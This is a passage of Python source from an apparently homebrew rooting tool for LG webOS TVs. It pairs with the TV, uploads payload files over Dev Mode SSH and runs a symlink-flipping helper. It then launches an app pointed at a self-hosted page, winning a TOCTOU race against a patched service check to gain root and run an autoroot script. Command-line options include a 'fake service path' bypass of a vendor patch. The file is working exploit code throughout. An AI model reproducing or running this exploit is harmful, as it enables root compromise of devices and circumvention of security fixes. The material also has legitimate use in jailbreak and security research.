        def _send(self, status, data, content_type):
            if isinstance(data, str):
                data = data.encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(data)

        def do_GET(self):
            path = urlsplit(self.path).path
            if path == "/status":
                self._send(200, json.dumps(state.status()), "application/json")
                return
            if path in ("/", "/" + RACE_ENTRY_PAGE):
                data = read_wwwroot_file(RACE_ENTRY_PAGE)
                if data is None:
                    self._send(500, "race page is missing", "text/plain")
                    return
                self._send(200, data, "text/html; charset=utf-8")
                return
            self._send(404, "not found", "text/plain")

        def do_POST(self):
            path = urlsplit(self.path).path
            if path != "/report":
                self._send(404, "not found", "text/plain")
                return
            try:
                length = int(self.headers.get("Content-Length", "0"))
                if length <= 0 or length > 262144:
                    raise ValueError("invalid report size")
                report = json.loads(self.rfile.read(length).decode("utf-8"))
                if not isinstance(report, dict):
                    raise ValueError("report is not an object")
                state.report(report)
                if report.get("final"):
                    log("race page finished: %s; counts=%s" % (
                        report.get("reason", "unknown"),
                        json.dumps(report.get("counts", {}), sort_keys=True),
                    ))
                self._send(200, "{}", "application/json")
            except Exception as exc:
                self._send(400, str(exc), "text/plain")

        def log_message(self, fmt, *args):
            pass

    return RaceHandler


def start_race_http_server(state):
    return _start_http_server(make_race_http_handler(state), "0.0.0.0", 8080)


RACE_FLIPPER_JS_FILE = "flipper.js"
RACE_FLIPPER_SH_FILE = "flipper.sh"
RACE_SERVICE_FILE = "race-service.js"
RACE_REQUIRED_FILES = [
    RACE_ENTRY_PAGE,
    RACE_FLIPPER_JS_FILE,
    RACE_FLIPPER_SH_FILE,
    RACE_SERVICE_FILE,
    SHELL_SCRIPT,
]


def read_wwwroot_file(rel_path):
    """Read a required runtime asset from the real wwwroot directory."""
    root_dir = resolve_wwwroot_path()
    data = _read_filesystem_file(root_dir, rel_path)
    if data is None:
        raise RaceError("required wwwroot file is missing: %s" % rel_path)
    return data


def require_race_assets():
    missing = []
    for rel_path in RACE_REQUIRED_FILES:
        if _read_filesystem_file(resolve_wwwroot_path(), rel_path) is None:
            missing.append(rel_path)
    if missing:
        raise RaceError(
            "race mode requires external wwwroot files; missing: %s"
            % ", ".join(missing)
        )



def make_race_root_payload(base, wrapper):
    template = read_wwwroot_file(RACE_SERVICE_FILE).decode("utf-8")
    base_token = "__SLOPBRO_RACE_BASE__"
    wrapper_token = "__SLOPBRO_AUTOROOT_WRAPPER__"
    if template.count(base_token) != 1 or template.count(wrapper_token) != 1:
        raise RaceError("invalid race-service.js template placeholders")
    # The tokens occur inside JavaScript string literals. Escape the values
    # without adding another pair of quotes so the template remains valid JS.
    payload = template.replace(base_token, json.dumps(base)[1:-1])
    payload = payload.replace(wrapper_token, json.dumps(wrapper)[1:-1])
    if "__SLOPBRO_" in payload:
        raise RaceError("unexpanded placeholder in race-service.js")
    return payload


class RaceManager:
    def __init__(
        self,
        ssh,
        base,
        attempts,
        trusted,
        app_id=None,
        debug=False,
        curl_insecure=False,
        hbchannel_ipk=None,
        keep_files=False,
    ):
        self.ssh = ssh
        self.base = base
        self.attempts = attempts
        self.trusted = trusted
        self.app_id = app_id or trusted.rstrip('/').rsplit('/', 1)[-1]
        self.debug = debug
        self.curl_insecure = curl_insecure
        self.hbchannel_ipk = hbchannel_ipk
        self.keep_files = keep_files
        self.payload = base + "/payload"
        self.autoroot = base + "/autoroot.sh"
        self.wrapper = base + "/run-autoroot.sh"
        self.pid_file = base + "/helper.pid"
        self.ready_file = base + "/helper.ready"
        self.root_flag = base + "/rooted.flag"
        self.autoroot_done = base + "/autoroot.done"
        self.autoroot_log = base + "/autoroot.log"

    def prepare(self):
        if self.ssh.exists(self.base):
            raise RaceError("race directory already exists: %s" % self.base)
        self.ssh.run(
            "mkdir -p %s && chmod 777 %s && chmod 755 %s"
            % (_shq(self.payload), _shq(self.base), _shq(self.payload))
        )

        self.ssh.put(self.payload + "/service.js", make_race_root_payload(self.base, self.wrapper))
        self.ssh.put(
            self.payload + "/package.json",
            json.dumps({"name": self.app_id, "main": "service.js"}) + "\n",
        )
        self.ssh.put(
            self.payload + "/services.json",
            json.dumps({
                "id": self.app_id,
                "services": [{"name": self.app_id}],
            }) + "\n",
        )
        self.ssh.put(self.payload + "/flipper.js", read_wwwroot_file(RACE_FLIPPER_JS_FILE))
        self.ssh.put(self.base + "/flipper.sh", read_wwwroot_file(RACE_FLIPPER_SH_FILE))
        self.ssh.put(self.autoroot, read_wwwroot_file(SHELL_SCRIPT))

        if self.hbchannel_ipk:
            try:
                with open(self.hbchannel_ipk, "rb") as fh:
                    ipk_data = fh.read()
            except OSError as exc:
                raise RaceError("cannot read Homebrew Channel IPK: %s" % exc)
            self.ssh.put(self.base + "/hbchannel.ipk", ipk_data)

        flags = []
        if self.debug:
            flags.append("--debug")
        if self.curl_insecure:
            flags.append("--curl-insecure")
        flag_text = " ".join(_shq(f) for f in flags)
        wrapper = """#!/bin/sh
IPK_SRC=%s sh %s %s >%s 2>&1
echo $? >%s
""" % (
            _shq(self.base + "/hbchannel.ipk"),
            _shq(self.autoroot),
            flag_text,
            _shq(self.autoroot_log),
            _shq(self.autoroot_done),
        )
        self.ssh.put(self.wrapper, wrapper)
        self.ssh.run(
            "chmod 644 %s %s %s %s %s %s && ln -s %s %s"
            % (
                _shq(self.payload + "/service.js"),
                _shq(self.payload + "/package.json"),
                _shq(self.payload + "/services.json"),
                _shq(self.autoroot),
                _shq(self.wrapper),
                _shq(self.payload + "/flipper.js"),
                _shq(self.trusted),
                _shq(self.base + "/k3static"),
            )
        )

    def start_flipper(self):
        proc = self.ssh.run(
            "if [ -x /usr/bin/node ]; then printf '/usr/bin/node'; "
            "elif command -v node >/dev/null 2>&1; then command -v node; fi"
        )
        node = proc.stdout.decode("ascii", "ignore").strip()
        args = "%s %d %s %s" % (
            _shq(self.base), self.attempts, _shq(self.trusted), _shq(self.payload)
        )
        if node:
            node_test = self.ssh.run(_shq(node) + " -e 'process.exit(0)'", check=False)
            if node_test.returncode != 0:
                log("Node.js is present but failed to execute; using shell fallback")
                node = ""
        if node:
            log("using Node.js flipper: %s" % node)
            command = "nohup %s %s %s >>%s 2>&1 </dev/null & echo $! >%s" % (
                _shq(node), _shq(self.payload + "/flipper.js"), args,
                _shq(self.base + "/helper.log"), _shq(self.pid_file),
            )
        else:
            log("Node.js is unavailable; testing shell flipper with atomic mv -T")
            test_dir = self.base + "/mv-test"
            self.ssh.run(
                "mkdir %s && touch %s/a && mv -fT %s/a %s/b && rm -rf %s"
                % (_shq(test_dir), _shq(test_dir), _shq(test_dir),
                   _shq(test_dir), _shq(test_dir))
            )
            command = "nohup sh %s %s >>%s 2>&1 </dev/null & echo $! >%s" % (
                _shq(self.base + "/flipper.sh"), args,
                _shq(self.base + "/helper.log"), _shq(self.pid_file),
            )
        self.ssh.run(command)

    def wait_until_ready(self, timeout=60):
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self.ssh.exists(self.ready_file):
                first = self.ssh.exists(self.base + "/k3u0")
                last = self.ssh.exists(self.base + "/k3u%d" % (self.attempts - 1))
                if first and last:
                    log("flipper is ready; all unique symlinks were created")
                    return
            if self.ssh.exists(self.base + "/helper.error"):
                raise RaceError("flipper failed:\n" + self.log_tail("helper.log"))
            if not self.ssh.pid_alive(self.pid_file):
                raise RaceError("flipper exited before readiness:\n" + self.log_tail("helper.log"))
            time.sleep(0.35)
        raise RaceError("timed out waiting for flipper readiness:\n" + self.log_tail("helper.log"))

    def rooted(self):
        return self.ssh.exists(self.root_flag)

    def helper_alive(self):
        return self.ssh.pid_alive(self.pid_file)

    def autoroot_exit_code(self):
        if not self.ssh.exists(self.autoroot_done):
            return None
        text = self.ssh.read(self.autoroot_done, 100).strip()
        try:
            return int(text.splitlines()[-1])
        except (ValueError, IndexError):
            raise RaceError("invalid autoroot status: %r" % text)

    def log_tail(self, name="helper.log", limit=5000):
        return self.ssh.read(self.base + "/" + name, limit)[-limit:]

    def cleanup(self):
        try:
            self.ssh.run("touch %s" % _shq(self.base + "/stop.flag"), check=False)
            self.ssh.run(
                "if [ -f %s ]; then kill $(cat %s) 2>/dev/null || true; fi"
                % (_shq(self.pid_file), _shq(self.pid_file)),
                check=False,
            )
            if not self.keep_files:
                self.ssh.run("rm -rf %s" % _shq(self.base), check=False)
                log("remote race files removed: %s" % self.base)
            else:
                log("remote race files preserved: %s" % self.base)
        except RaceError as exc:
            log("warning: race cleanup failed: %s" % exc)


def race_page_url(host, port, base, attempts, trusted, local_ip_override=None):
    local_ip = local_ip_override or local_ip_for_remote(host)
    query = urlencode({"base": base, "attempts": attempts, "trusted": trusted})
    return "http://%s:%d/%s?%s" % (local_ip, port, RACE_ENTRY_PAGE, query)


def _race_result_counts(state):
    report = state.final or state.progress or {}
    return report.get("counts", {})


def run_race(
    host,
    debug=False,
    local_ip_override=None,
    webos_version_override=None,
    curl_insecure=False,
    attempts=1000,
    batches=1,
    race_timeout=180,
    autoroot_timeout=300,
    ssh_user="prisoner",
    ssh_port=9922,
    ssh_key=None,
    ssh_options=None,
    trusted=RACE_DEFAULT_TRUSTED,
    race_app_id=None,
    hbchannel_ipk=None,
    keep_files=False,
):
    if attempts < 1 or batches < 1:
        raise RaceError("attempts and batches must be positive")
    require_race_assets()
    if not trusted.startswith("/usr/palm/services/"):
        raise RaceError("trusted service must be below /usr/palm/services/")

    ssh = SSHRunner(host, ssh_user, ssh_port, ssh_key, ssh_options)
    ssh.run("printf 'ssh-ok'")
    log("Dev Mode SSH connection succeeded")

    ws = None
    client = None
    http_server = None
    manager = None
    state = None
    try:
        ws = WebSocket.connect(host, PORT_TLS, secure=True)
        client = SSAPClient(ws)
        stored_key = load_client_key(host)
        new_key = client.register(stored_key, DEFAULT_MANIFEST)
        if new_key and new_key != stored_key:
            save_client_key(host, new_key)
        log("SSAP registration succeeded")

        target_apps = target_apps_for_webos_version(TARGET_APPS, webos_version_override)
        if not target_apps:
            raise RaceError("no target apps configured for this webOS version")
        app_id, url_param_name = verify_app_present(client, target_apps)

        for batch in range(batches):
            run_id = "%d-%s" % (int(time.time()), secrets.token_hex(4))
            base = "/tmp/slopbro-race-" + run_id
            state = RaceState()
            manager = RaceManager(
                ssh, base, attempts, trusted, race_app_id, debug, curl_insecure,
                hbchannel_ipk, keep_files,
            )
            log("race batch %d/%d; directory=%s" % (batch + 1, batches, base))
            try:
                manager.prepare()
                manager.start_flipper()
                manager.wait_until_ready()
                http_server = start_race_http_server(state)
                page_url = race_page_url(
                    host, http_server.server_port, base, attempts, trusted,
                    local_ip_override,
                )
                log("launching %s -> %s" % (app_id, page_url))
                launch_app(client, app_id, {url_param_name: page_url})

                deadline = time.time() + race_timeout
                rooted = False
                while time.time() < deadline:
                    if manager.rooted():
                        rooted = True
                        state.request_stop(root=True)
                        log("ROOT CONFIRMED by root-only marker")
                        break
                    if state.final is not None:
                        break
                    if not manager.helper_alive() and state.final is None:
                        raise RaceError("flipper exited during race:\n" + manager.log_tail())
                    time.sleep(0.3)

                if not rooted and manager.rooted():
                    rooted = True
                    state.request_stop(root=True)
                if rooted:
                    log("waiting for autoroot.sh to finish")
                    autoroot_deadline = time.time() + autoroot_timeout
                    exit_code = None
                    while time.time() < autoroot_deadline:
                        exit_code = manager.autoroot_exit_code()
                        if exit_code is not None:
                            break
                        time.sleep(1.0)
                    if exit_code is None:
                        raise RaceError("root obtained, but autoroot timed out:\n" + manager.log_tail("autoroot.log"))
                    if exit_code != 0:
                        raise RaceError("root obtained, but autoroot exited %d:\n%s" % (
                            exit_code, manager.log_tail("autoroot.log")
                        ))
                    result = {
                        "returnValue": True,
                        "root": True,
                        "autorootExitCode": exit_code,
                        "batch": batch + 1,
                        "attemptsReported": _race_result_counts(state),
                    }
                    print(json.dumps(result, sort_keys=True))
                    log("rooting and autoroot completed successfully")
                    return result

                counts = _race_result_counts(state)
                log("race batch did not obtain root; counts=%s" % json.dumps(counts, sort_keys=True))
                if state.final is None:
                    log("race batch timed out")
                elif state.final.get("reason", "").startswith("precheck"):
                    raise RaceError("race precheck failed: %s" % state.final.get("reason"))
            finally:
                if state is not None:
                    state.request_stop(root=False)
                if http_server is not None:
                    http_server.shutdown()
                    http_server.server_close()
                    http_server = None
                if manager is not None:
                    if debug or keep_files:
                        log("helper log tail:\n" + manager.log_tail())
                    manager.cleanup()
                manager = None

        raise RaceError("all race batches completed without a root marker")
    finally:
        if state is not None:
            state.request_stop(root=False)
        if http_server is not None:
            http_server.shutdown()
            http_server.server_close()
        if manager is not None:
            manager.cleanup()
        if client is not None:
            client.close()
        elif ws is not None:
            ws.close()


def _fake_service_path_arg(value):
    if not value.strip():
        raise argparse.ArgumentTypeError("value must not be empty")
    return value


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Pair with an LG webOS TV and launch a self-hosted payload page.",
        add_help=False,
    )
    parser.add_argument(
        "-h", "--help", "-?", action="help",
        help="show this help message and exit",
    )
    parser.add_argument(
        "--debug", action="store_true", help="enable payload debug output",
    )
    parser.add_argument(
        "--curl-insecure", action="store_true",
        help="disable curl TLS certificate verification for payload downloads",
    )
    parser.add_argument(
        "--fake-service-path", metavar="<path>",
        default=DEFAULT_FAKE_SERVICE_PATH, type=_fake_service_path_arg,
        help="fake service path used to bypass the service launch patch",
    )
    parser.add_argument(
        "--no-fake-service-path", dest="fake_service_path",
        action="store_const", const="",
        help="disable the fake service path bypass",
    )
    parser.add_argument(
        "--asset-source", choices=ASSET_SOURCES, default=ASSET_SOURCE_AUTO,
        help="asset location (default: %(default)s)",
    )
    parser.add_argument(
        "--local-ip", metavar="<ipv4>",
        help="override the advertised local IPv4 address",
    )
    parser.add_argument(
        "--webos-version", metavar="<version>",
        help="limit target apps by webOS version (e.g. 6.5); not auto-detected",
    )
    parser.add_argument(
        "--test-server", choices=TEST_SERVER_MODES,
        help="serve a connectivity response (simple) or payload without pairing",
    )
    parser.add_argument(
        "--race-lgpsve2445", action="store_true",
        help="use the SSH-assisted TOCTOU bypass for the realpath jsserver patch",
    )
    parser.add_argument(
        "--race-attempts", type=int, default=1000, metavar="<n>",
        help="unique race pathnames per batch (default: %(default)s)",
    )
    parser.add_argument(
        "--race-batches", type=int, default=1, metavar="<n>",
        help="fresh race directories/batches to try (default: %(default)s)",
    )
    parser.add_argument(
        "--race-timeout", type=int, default=180, metavar="<seconds>",
        help="maximum time per race batch (default: %(default)s)",
    )
    parser.add_argument(
        "--autoroot-timeout", type=int, default=300, metavar="<seconds>",
        help="maximum autoroot.sh runtime after root (default: %(default)s)",
    )
    parser.add_argument(
        "--race-ssh-user", default="prisoner", metavar="<user>",
        help="Dev Mode SSH user (default: %(default)s)",
    )
    parser.add_argument(
        "--race-ssh-port", type=int, default=9922, metavar="<port>",
        help="Dev Mode SSH port (default: %(default)s)",
    )
    parser.add_argument(
        "--race-ssh-key", metavar="<path>",
        help="private key for Dev Mode SSH (default: ssh agent/default keys)",
    )
    parser.add_argument(
        "--race-ssh-option", action="append", default=[], metavar="<option>",
        help="extra OpenSSH -o option; may be repeated",
    )
    parser.add_argument(
        "--race-trusted", default=RACE_DEFAULT_TRUSTED, metavar="<path>",
        help="existing trusted service directory (default: %(default)s)",
    )
    parser.add_argument(
        "--race-app-id", metavar="<id>",
        help="appId shared by trusted/payload metadata (default: trusted basename)",
    )
    parser.add_argument(
        "--hbchannel-ipk", metavar="<path>",
        help="optional clean Homebrew Channel IPK to upload for autoroot",
    )
    parser.add_argument(
        "--race-keep-files", action="store_true",
        help="preserve remote race directory and logs after each batch",
    )
    parser.add_argument(
        "host", nargs="?", metavar="<tv-ip-or-host>",
        help="TV address (required except in test-server modes; recommended there)",
    )
    args = parser.parse_args(argv)
    if args.local_ip is not None and not _validate_ipv4_address(args.local_ip):
        parser.error("invalid --local-ip value '%s'" % args.local_ip)
    if args.webos_version is not None and not args.webos_version.strip():
        parser.error("--webos-version value must not be empty")
    if args.test_server is None and args.host is None:
        parser.error("<tv-ip-or-host> is required unless --test-server is used")
    if args.race_lgpsve2445 and args.test_server is not None:
        parser.error("--race-lgpsve2445 cannot be combined with --test-server")
    if args.race_attempts < 1 or args.race_batches < 1:
        parser.error("--race-attempts and --race-batches must be positive")
    if args.race_timeout < 1 or args.autoroot_timeout < 1:
        parser.error("race timeouts must be positive")

    if args.race_lgpsve2445:
        try:
            run_race(
                args.host,
                debug=args.debug,
                local_ip_override=args.local_ip,
                webos_version_override=args.webos_version,
                curl_insecure=args.curl_insecure,
                attempts=args.race_attempts,
                batches=args.race_batches,
                race_timeout=args.race_timeout,
                autoroot_timeout=args.autoroot_timeout,
                ssh_user=args.race_ssh_user,
                ssh_port=args.race_ssh_port,
                ssh_key=args.race_ssh_key,
                ssh_options=args.race_ssh_option,
                trusted=args.race_trusted,
                race_app_id=args.race_app_id,
                hbchannel_ipk=args.hbchannel_ipk,
                keep_files=args.race_keep_files,
            )
        except RaceError as exc:
            die(str(exc))
    elif args.test_server == TEST_SERVER_SIMPLE:
        run_test_connection(
            args.host,
            local_ip_override=args.local_ip,
        )
    elif args.test_server == TEST_SERVER_PAYLOAD:
        run_test_payload(
            args.host,
            debug=args.debug,
            asset_source=args.asset_source,
            local_ip_override=args.local_ip,
            curl_insecure=args.curl_insecure,
            fake_service_path=args.fake_service_path,
        )
    else:
        run(
            args.host,
            debug=args.debug,
            asset_source=args.asset_source,
            local_ip_override=args.local_ip,
            webos_version_override=args.webos_version,
            curl_insecure=args.curl_insecure,
            fake_service_path=args.fake_service_path,
        )
    return 0


if __name__ == "__main__":
    sys.exit(main())
